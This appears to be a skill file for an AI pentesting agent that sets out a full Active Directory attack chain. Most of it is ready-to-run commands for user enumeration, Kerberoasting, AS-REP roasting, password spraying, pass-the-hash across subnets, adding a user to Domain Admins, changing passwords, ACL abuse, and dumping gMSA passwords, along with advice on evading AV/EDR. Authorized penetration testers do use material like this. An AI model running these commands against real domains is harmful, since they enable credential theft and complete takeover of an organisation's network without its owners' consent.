---
name: ad-domain-attack
description: "Full attack chain for Active Directory domain environments. Use when the target host is domain-joined (systeminfo shows Domain not WORKGROUP), ports 88/389/636 are exposed, or domain user credentials are obtained. Covers domain information gathering, user enumeration, Kerberoasting, AS-REP Roasting, delegation attacks, ACL abuse, DCSync, and Golden/Silver Tickets"
zh-signals: "覆盖 Active Directory 域环境攻击全链路，从信息收集、Kerberoasting 到委派攻击、ACL 滥用与 DCSync 提权。信号:AD域攻击,Kerberoasting,委派攻击,DCSync,域控"
when-to-use: "Use when the target host is domain-joined, ports 88/389/636 are exposed, or domain user credentials are obtained and you need full AD attack paths."
metadata:
  tags: "ad,domain,kerberos,kerberoasting,asrep,delegation,dcsync,golden ticket,acl,domain-controller,lateral-movement,ntlm,bloodhound,zerologon,CVE-2020-1472,netlogon"
  category: "lateral"
  mitre_attack: "T1558.003,T1558.004,T1003.006,T1550.002,T1550.003,T1098,T1484"
---

# AD Domain Attack Methodology

Owning the domain controller = controlling the entire network.

## ⛔ Further Reading (Must Read)

- Domain recon environment setup and initial enumeration → [references/ad-recon-setup.md](references/ad-recon-setup.md)
- Deep enumeration methods after authentication → [references/authenticated-enum.md](references/authenticated-enum.md)
- Detailed commands for password spraying, AS-REP Roasting, Kerberoasting → [references/credential-attacks.md](references/credential-attacks.md)
- Delegation attacks (RBCD), ACL abuse, DCSync, persistence → [references/domain-escalation.md](references/domain-escalation.md)
- → [references/zerologon-attack.md](references/zerologon-attack.md) — the CVE-2020-1472 ZeroLogon attack and remediation

---

## Phase 1: Domain Environment Confirmation and Information Gathering

### 1.1 Confirm the domain environment
```bash
systeminfo | findstr /i "domain"       # Windows
nltest /dclist:DOMAIN_NAME
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN  # Linux
```
The domain controller IP is usually the DNS server (the DNS Server entry in `ipconfig /all`).

### 1.2 Domain enumeration (no credentials required)
```bash
kerbrute userenum -d DOMAIN --dc DC_IP userlist.txt
netexec ldap DC_IP -u '' -p '' --users   # LDAP anonymous bind
```

### 1.3 Deep domain enumeration (domain user credentials required)
```bash
netexec ldap DC_IP -u USER -p PASS --users
net accounts /domain    # password policy (lockout threshold!)
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP   # SPN enumeration
bloodhound-python -d DOMAIN -u USER -p PASS -dc DC_IP -c all
```
BloodHound automatically discovers attack paths and is the most powerful tool for domain penetration.

## Phase 2: Attack Decision Tree

```
Which credentials do you have?
├─ No credentials → AS-REP Roasting (users without pre-authentication) → [references/credential-attacks.md](references/credential-attacks.md)
├─ Any domain user → Kerberoasting (SPN service accounts) → [references/credential-attacks.md](references/credential-attacks.md)
│             → password spraying (check the lockout policy first!) → [references/credential-attacks.md](references/credential-attacks.md)
│             → BloodHound to find attack paths
├─ Local administrator → SAM dump → PTH lateral movement → credential reuse
├─ Domain Admin rights → DCSync to extract all hashes → [references/domain-escalation.md](references/domain-escalation.md)
└─ Delegation/ACL path found → delegation attack/ACL abuse → [references/domain-escalation.md](references/domain-escalation.md)
```

### Credential Reuse Quick Reference
```bash
netexec smb 10.0.0.0/24 -u USER -p PASS --continue-on-success
netexec smb 10.0.0.0/24 -u admin -H NTLM_HASH   # PTH
```

## Tool Quick Reference
| Scenario | Recommended tool |
|------|----------|
| Domain enumeration | BloodHound, netexec |
| Ticket attacks | the impacket suite |
| Password cracking | hashcat |
| Vulnerability exploitation | certipy (ADCS), zerologon scripts |
| NTLM relaying | ntlmrelayx + Responder |
| Certificate attacks | certipy (ESC1-ESC11) |
## Password Spray Safety Policy
- Check the domain password policy: Lockout duration (lockout period/cool-down time)
- Avoid account lockout impacting availability
- observation window: understand when the counter resets

## Tool Alternatives and Evasion
- SharpHound may be blocked (AV/EDR), so alternatives are needed
- LDAP queries can run remotely: no tool upload, no contact with the target file system

## Supplementary Tools

### bloodyAD — AD LDAP operations
```bash
# Add a user to a group
bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP add groupMember "Domain Admins" "TARGET_USER"
# Modify ACL (add GenericAll)
bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP add genericAll "OU=xxx,DC=dom,DC=local" TARGET_USER
# Query writable objects
bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP get writable
# Change a password
bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP set password TARGET_USER "NewP@ss123"
```

### ldeep — deep LDAP enumeration
```bash
# Connect and enumerate
ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP all
# Enumerate delegation configurations
ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP delegations
# Enumerate SPNs
ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP spns
# Enumerate ASREPRoast users
ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP asreproast
# Enumerate trust relationships
ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP trusts
```

### enum4linux-ng — SMB/RPC enumeration
```bash
# Full enumeration (users, groups, shares, policies, RID)
enum4linux-ng -A TARGET_IP
# Authenticated enumeration
enum4linux-ng -A TARGET_IP -u USER -p PASS
# Users only
enum4linux-ng -U TARGET_IP -u USER -p PASS
```

### gMSADumper — gMSA password extraction
```bash
# Export gMSA account passwords
python3 /pentest/gMSADumper/gMSADumper.py -d DOMAIN -u USER -p PASS -l DC_IP
```
